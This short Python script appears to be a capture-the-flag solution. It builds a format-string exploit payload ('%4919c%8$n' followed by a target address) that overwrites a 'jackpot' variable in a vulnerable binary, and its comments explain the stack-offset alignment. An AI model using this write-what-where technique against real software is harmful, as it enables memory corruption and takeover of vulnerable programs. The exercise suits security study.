import sys 

#Jackpot address = 0x601074

#Write to payload file
with open("payload", 'wb') as f:
	#f.write(b"AAAAAAAA\x74\x10\x60\x00\x00\x00\x00\x00")
	#f.write(b"%7$nAAAA\x74\x10\x60\x00\x00\x00\x00\x00") # jackpot is the 2nd item on the stack = 7th argument
	f.write(b"%4919c%8$nAAAAAA\x74\x10\x60\x00\x00\x00\x00\x00") 
	#using "%4919c" will make payload > 16 bytes hence we shift one slot down to the 8th argument so that the payload will still be 8 bytes aligned

